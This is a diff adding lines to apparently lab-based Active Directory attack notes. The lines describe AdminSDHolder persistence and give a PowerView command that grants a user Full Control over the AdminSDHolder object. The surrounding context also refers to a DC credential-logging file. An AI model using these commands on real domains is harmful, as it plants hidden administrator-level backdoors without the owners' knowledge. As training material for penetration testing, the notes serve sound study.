@@ -407,5 +407,21 @@ All local logons on the DC are now logged to `C:\Windows\system32\mimilsa.log`
 
 
 - With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
-- 
+- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
 
+
+**_Example -:**
+
+
+
+- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+
+
+```powershell
+# Powerview
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-
+dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -
+Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+```
